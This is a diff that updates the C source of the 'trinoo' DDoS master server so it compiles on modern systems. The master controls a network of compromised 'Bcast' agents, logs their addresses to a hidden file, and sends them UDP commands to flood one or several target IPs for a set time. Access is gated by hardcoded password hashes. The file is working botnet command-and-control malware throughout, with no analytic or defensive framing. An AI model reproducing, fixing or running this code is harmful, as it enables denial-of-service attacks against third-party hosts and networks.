@@ -1,7 +1,12 @@
+#define _XOPEN_SOURCE 1000
+#define _BSD_SOURCE
+
+#include <arpa/inet.h>
 #include <stdio.h>
 #include <stdlib.h>
 #include <stdarg.h>
 #include <string.h>
+#include <strings.h>
 #include <errno.h>
 #include <sys/socket.h>
 #include <sys/types.h>
@@ -9,12 +14,13 @@
 #include <sys/types.h>
 #include <netinet/in.h>
 #include <netdb.h>
+#include <time.h>
 #include <unistd.h>
 #include <fcntl.h>
 #include "strfix.h"
 
-/* crypt key encrypted with the key 'bored'(so hex edit cannot get key easily?)
-   comment out for no encryption... */
+	/* crypt key encrypted with the key 'bored'(so hex edit cannot get key easily?)
+	   comment out for no encryption... */
 #define CRYPTKEY "ZsoTN.cq4X31"
 
 #ifdef CRYPTKEY
@@ -25,8 +31,19 @@
 
 #define PROMPT "trinoo>"
 
-/* FILE holding Bcasts. */
+	/* FILE holding Bcasts. */
 #define OUTFILE "..."
+
+#define Fgets(f,b,s) \
+	if (fgets(f, b, s) == NULL) {\
+		;\
+	}
+
+#define Write(f,b,s) \
+	if (write(f, b, s) == 0) {\
+		;\
+	}
+
 
 int checkonip(char *);
 int sendtolist(int, char *, int);
@@ -36,19 +53,20 @@ char *encrypt_string(char *, char *);
 char *decrypt_string(char *, char *);
 #endif
 
-main(int argc, char *argv[])
+int main(int argc __attribute__((unused)), char **argv __attribute__((unused)), char **envp __attribute__((unused)))
 {
 	struct sockaddr_in master, from, tcpmast, tcpconn;
-	int sock, sock2, fromlen, numread, bewm = 0, auth, maxfd, alt;
-	int list = 1, i, foke, hoe, blist, argi, outport = 27444, ttout =
+	socklen_t fromlen;
+	int sock, sock2, numread, bewm = 0, auth = 0, alt;
+	int list = 1, foke, hoe, blist, argi, outport = 27444, ttout =
 	    300, idle = 0;
+	unsigned int i;
 	int pongr = 0;
 	FILE *out;
 	char buf[1024], outbuf[1024], old, comm[15], *arg1;
-	char pass[8], *uptime, *dec, *enc;
-	long lookip;
+	char pass[8], *dec, *enc;
+	struct in_addr lookip;
 	fd_set myfds;
-	time_t now, hr, min, onlineat;
 	struct timeval tv;
 	struct hostent *he;
 	old = 0 - 28;
@@ -68,7 +86,7 @@ main(int argc, char *argv[])
 		exit(-1);
 	}
 	printf("?? ");
-	fgets(buf, 1024, stdin);
+	Fgets(buf, 1024, stdin);
 	buf[strlen(buf) - 1] = 0;
 	if (strcmp((char *)crypt(buf, "0n"), "0nm1VNMXqRMyM") != 0) {
 		exit(-1);
@@ -127,8 +145,9 @@ main(int argc, char *argv[])
 					    0) {
 						out = fopen(OUTFILE, "a");
 						sprintf(outbuf, "%s",
-							(char *)inet_ntoa(from.
-									  sin_addr));
+							(char *)
+							inet_ntoa
+							(from.sin_addr));
 #ifdef CRYPTKEY
 						enc =
 						    encrypt_string
@@ -144,9 +163,9 @@ main(int argc, char *argv[])
 						if (bewm > 0) {
 							sprintf(outbuf,
 								"NEW Bcast - %s\n",
-								inet_ntoa(from.
-									  sin_addr));
-							write(bewm, outbuf,
+								inet_ntoa
+								(from.sin_addr));
+							Write(bewm, outbuf,
 							      strlen(outbuf));
 						}
 					}
@@ -157,9 +176,9 @@ main(int argc, char *argv[])
 						sprintf(outbuf,
 							"PONG %d Received from %s\n",
 							pongr,
-							inet_ntoa(from.
-								  sin_addr));
-						write(bewm, outbuf,
+							inet_ntoa
+							(from.sin_addr));
+						Write(bewm, outbuf,
 						      strlen(outbuf));
 					}
 			}
@@ -183,9 +202,9 @@ main(int argc, char *argv[])
 				if (auth == 1) {
 					sprintf(outbuf,
 						"Warning: Connection from %s\n",
-						(char *)inet_ntoa(&tcpconn.
-								  sin_addr));
-					write(bewm, outbuf, strlen(outbuf));
+						(char *)
+						inet_ntoa(tcpconn.sin_addr));
+					Write(bewm, outbuf, strlen(outbuf));
 				}
 			}
 			if (FD_ISSET(bewm, &myfds)) {
@@ -209,7 +228,7 @@ main(int argc, char *argv[])
 						sprintf(outbuf,
 							"trinoo %s..[rpm8d/cb4Sx/]\n\n\n",
 							VERSION);
-						write(bewm, outbuf,
+						Write(bewm, outbuf,
 						      strlen(outbuf));
 						auth = 1;
 					} else {
@@ -220,18 +239,18 @@ main(int argc, char *argv[])
 				}
 				if (strcmp(buf, "bcast") == 0) {
 					sprintf(outbuf, "Listing Bcasts.\n\n");
-					write(bewm, outbuf, strlen(outbuf));
+					Write(bewm, outbuf, strlen(outbuf));
 					out = fopen(OUTFILE, "r");
 					if (out == NULL) {
 						sprintf(outbuf,
 							"ERROR: Cannot open Bcasts file. Will create a new BLANK one.\n");
-						write(bewm, outbuf,
+						Write(bewm, outbuf,
 						      strlen(outbuf));
 						out = fopen(OUTFILE, "w");
 						if (out == NULL) {
 							sprintf(outbuf,
 								"ERROR: Cannot even create a blank Bcasts. Mine as well shutdown the server.\n");
-							write(bewm, outbuf,
+							Write(bewm, outbuf,
 							      strlen(outbuf));
 						}
 					} else {
@@ -256,7 +275,7 @@ main(int argc, char *argv[])
 #endif
 							if (strlen(outbuf) > 3) {
 								blist++;
-								write(bewm,
+								Write(bewm,
 								      outbuf,
 								      strlen
 								      (outbuf));
@@ -267,14 +286,14 @@ main(int argc, char *argv[])
 						sprintf(outbuf,
 							"\nEnd. %d Bcasts total.\n",
 							blist);
-						write(bewm, outbuf,
+						Write(bewm, outbuf,
 						      strlen(outbuf));
 					}
 				}
 				if (strcmp(buf, "die") == 0) {
 					sprintf(outbuf,
 						"Shutting down.\nNOTICE: Better restart me?\n");
-					write(bewm, outbuf, strlen(outbuf));
+					Write(bewm, outbuf, strlen(outbuf));
 					close(bewm);
 					close(sock);
 					close(sock2);
@@ -283,7 +302,7 @@ main(int argc, char *argv[])
 				}
 				if (strcmp(buf, "quit") == 0) {
 					sprintf(outbuf, "bye bye.\n");
-					write(bewm, outbuf, strlen(outbuf));
+					Write(bewm, outbuf, strlen(outbuf));
 					close(bewm);
 					bewm = 0;
 					list = 1;
@@ -296,7 +315,7 @@ main(int argc, char *argv[])
 					if (strlen(arg1) < 1) {
 						sprintf(outbuf,
 							"mtimer: usage: mtimer <seconds to DoS>\n");
-						write(bewm, outbuf,
+						Write(bewm, outbuf,
 						      strlen(outbuf));
 					} else {
 						argi = atoi(arg1);
@@ -304,20 +323,20 @@ main(int argc, char *argv[])
 							argi = 500;
 							sprintf(outbuf,
 								"mtimer: You specified amount over 2000, set to 500!\n");
-							write(bewm, outbuf,
+							Write(bewm, outbuf,
 							      strlen(outbuf));
 						}
 						if (argi < 1) {
 							argi = 300;
 							sprintf(outbuf,
 								"mtimer: You specified amount less than one. Set to 300!\n");
-							write(bewm, outbuf,
+							Write(bewm, outbuf,
 							      strlen(outbuf));
 						}
 						sprintf(outbuf,
 							"mtimer: Setting timer on bcast to %d.\n",
 							argi);
-						write(bewm, outbuf,
+						Write(bewm, outbuf,
 						      strlen(outbuf));
 						sprintf(outbuf, "bbb %s %d",
 							pass, argi);
@@ -329,13 +348,13 @@ main(int argc, char *argv[])
 					if (strlen(arg1) < 1) {
 						sprintf(outbuf,
 							"DoS: usage: dos <ip>\n");
-						write(bewm, outbuf,
+						Write(bewm, outbuf,
 						      strlen(outbuf));
 					} else {
 						sprintf(outbuf,
 							"DoS: Packeting %s.\n",
 							arg1);
-						write(bewm, outbuf,
+						Write(bewm, outbuf,
 						      strlen(outbuf));
 						sprintf(outbuf, "aaa %s %s",
 							pass, arg1);
@@ -349,7 +368,7 @@ main(int argc, char *argv[])
 					     "ErDVt6azHrePE") == 0) {
 						sprintf(outbuf,
 							"mdie: Disabling Bcasts.\n");
-						write(bewm, outbuf,
+						Write(bewm, outbuf,
 						      strlen(outbuf));
 						sprintf(outbuf, "d1e %s", pass);
 						sendtolist(outport, outbuf,
@@ -357,14 +376,14 @@ main(int argc, char *argv[])
 					} else {
 						sprintf(outbuf,
 							"mdie: password?\n");
-						write(bewm, outbuf,
+						Write(bewm, outbuf,
 						      strlen(outbuf));
 					}
 				}
 				if (strcmp(comm, "mping") == 0) {
 					sprintf(outbuf,
 						"mping: Sending a PING to every Bcasts.\n");
-					write(bewm, outbuf, strlen(outbuf));
+					Write(bewm, outbuf, strlen(outbuf));
 					pongr = 0;
 					sprintf(outbuf, "png %s", pass);
 					sendtolist(outport, outbuf,
@@ -374,13 +393,13 @@ main(int argc, char *argv[])
 					if (strlen(arg1) < 3) {
 						sprintf(outbuf,
 							"MDoS: usage: mdos <ip1:ip2:ip3:>\n");
-						write(bewm, outbuf,
+						Write(bewm, outbuf,
 						      strlen(outbuf));
 					} else {
 						sprintf(outbuf,
 							"MDoS: Packeting %s.\n",
 							arg1);
-						write(bewm, outbuf,
+						Write(bewm, outbuf,
 						      strlen(outbuf));
 						sprintf(outbuf,
 							"xyz %s 123:%s:", pass,
@@ -393,9 +412,9 @@ main(int argc, char *argv[])
 					sprintf(outbuf,
 						"This is the \"trinoo\" AKA DoS Project master server. [%s]\nCompiled: %s %s\n",
 						VERSION, __TIME__, __DATE__);
-					write(bewm, outbuf, strlen(outbuf));
+					Write(bewm, outbuf, strlen(outbuf));
 				}
-				if (strcmp(comm, "msize") == 0)
+				if (strcmp(comm, "msize") == 0) {
 					if (atoi(arg1) > 0) {
 						sprintf(outbuf, "rsz %d",
 							atoi(arg1));
@@ -404,14 +423,15 @@ main(int argc, char *argv[])
 					} else {
 						sprintf(outbuf,
 							"msize: usage: msize <size>\n");
-						write(bewm, outbuf,
+						Write(bewm, outbuf,
 						      strlen(outbuf));
 					}
+				}
 				if (strcmp(comm, "nslookup") == 0) {
 					if (strlen(arg1) < 3) {
 						sprintf(outbuf,
 							"nslookup: usage: nslookup <host>\n");
-						write(bewm, outbuf,
+						Write(bewm, outbuf,
 						      strlen(outbuf));
 					} else {
 						he = gethostbyname(arg1);
@@ -419,18 +439,17 @@ main(int argc, char *argv[])
 							sprintf(outbuf,
 								"nslookup: host not found[%s]\n",
 								arg1);
-							write(bewm, outbuf,
+							Write(bewm, outbuf,
 							      strlen(outbuf));
 						} else {
 							memcpy(&lookip,
 							       (he->h_addr), 4);
 							sprintf(outbuf,
 								"nslookup: resolved %s to %s\n",
-								arg1,
-								(char *)
+								arg1, (char *)
 								inet_ntoa
 								(lookip));
-							write(bewm, outbuf,
+							Write(bewm, outbuf,
 							      strlen(outbuf));
 						}
 					}
@@ -438,7 +457,7 @@ main(int argc, char *argv[])
 				if (strcmp(comm, "killdead") == 0) {
 					sprintf(outbuf,
 						"killdead: Attempting to kill all dead broadcast\n");
-					write(bewm, outbuf, strlen(outbuf));
+					Write(bewm, outbuf, strlen(outbuf));
 					sprintf(outbuf, "shi %s", pass);
 					sendtolist(outport, outbuf,
 						   strlen(outbuf));
@@ -450,7 +469,7 @@ main(int argc, char *argv[])
 				if (strcmp(comm, "usebackup") == 0) {
 					sprintf(outbuf,
 						"usebackup: Switching to backup data file, If exist.\n");
-					write(bewm, outbuf, strlen(outbuf));
+					Write(bewm, outbuf, strlen(outbuf));
 					sprintf(outbuf, "%s-b", OUTFILE);
 					if ((out = fopen(outbuf, "r")) != NULL) {
 						fclose(out);
@@ -461,77 +480,77 @@ main(int argc, char *argv[])
 					if (strlen(arg1) < 3) {
 						sprintf(outbuf,
 							"Commands: info bcast mping mtimer dos mdos mdie quit nslookup\nDon't know what something is? 'help command'\n");
-						write(bewm, outbuf,
+						Write(bewm, outbuf,
 						      strlen(outbuf));
 					} else {
 						if (strcmp(arg1, "info") == 0) {
 							sprintf(outbuf,
 								"help info: Shows version/compile date of server\n");
-							write(bewm, outbuf,
+							Write(bewm, outbuf,
 							      strlen(outbuf));
 						}
 						if (strcmp(arg1, "bcast") == 0) {
 							sprintf(outbuf,
 								"help bcast: Lists broadcasts.\n");
-							write(bewm, outbuf,
+							Write(bewm, outbuf,
 							      strlen(outbuf));
 						}
 
 						if (strcmp(arg1, "mping") == 0) {
 							sprintf(outbuf,
 								"help mping: Sends a PING to every Bcasts.\n");
-							write(bewm, outbuf,
+							Write(bewm, outbuf,
 							      strlen(outbuf));
 						}
 
 						if (strcmp(arg1, "mtimer") == 0) {
 							sprintf(outbuf,
 								"help mtimer: Sets amount of seconds the Bcasts will DoS target.\nUsage: mtimer <seconds>\n");
-							write(bewm, outbuf,
+							Write(bewm, outbuf,
 							      strlen(outbuf));
 						}
 						if (strcmp(arg1, "dos") == 0) {
 							sprintf(outbuf,
 								"help dos: Packets target.\nUsage: dos <ip>\n");
-							write(bewm, outbuf,
+							Write(bewm, outbuf,
 							      strlen(outbuf));
 						}
 						if (strcmp(arg1, "mdos") == 0) {
 							sprintf(outbuf,
 								"help mdos: WARNING *BETA*\nPackets Targets at same time.\nUsage: mdos <target 1:target 2:target 3:>\n");
-							write(bewm, outbuf,
+							Write(bewm, outbuf,
 							      strlen(outbuf));
 						}
 						if (strcmp(arg1, "mdie") == 0) {
 							sprintf(outbuf,
 								"help mdie: WARNING DO NOT USE!\nDisables all Bcasts. Makes the daemon die.\n");
-							write(bewm, outbuf,
+							Write(bewm, outbuf,
 							      strlen(outbuf));
 						}
 						if (strcmp(arg1, "quit") == 0) {
 							sprintf(outbuf,
 								"help quit: Closes this connection!\n");
-							write(bewm, outbuf,
+							Write(bewm, outbuf,
 							      strlen(outbuf));
 						}
 						if (strcmp(arg1, "nslookup") ==
 						    0) {
 							sprintf(outbuf,
 								"help nslookup: Resolves hostname to a IP Address.\nUsage: nslookup <host>\n");
-							write(bewm, outbuf,
+							Write(bewm, outbuf,
 							      strlen(outbuf));
 						}
 						if (strcmp(arg1, "mstop") == 0) {
 							sprintf(outbuf,
 								"help mstop: Attempts to stop DoS.\n");
-							write(bewm, outbuf,
+							Write(bewm, outbuf,
 							      strlen(outbuf));
 						}
 					}
 				}
 				if (bewm > 0) {
 					sprintf(outbuf, "%s ", PROMPT);
-					write(bewm, outbuf, strlen(outbuf));
+					Write(bewm, outbuf, strlen(outbuf));
 				}
 				free(arg1);
 				idle = time(NULL);
@@ -544,6 +563,8 @@ main(int argc, char *argv[])
 				list = 1;
 			}
 	}
+
+	return 0;
 }
 
 int checkonip(char *ip)
@@ -576,7 +597,7 @@ int checkonip(char *ip)
 int sendtolist(int port, char *outbuf, int len)
 {
 	struct sockaddr_in out;
-	int sock, i;
+	int sock;
 	char buf[1024], *dec;
 	FILE *outread;
 	sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
@@ -603,4 +624,6 @@ int sendtolist(int port, char *outbuf, int len)
 		fclose(outread);
 	}
 	close(sock);
+
+	return 0;
 }
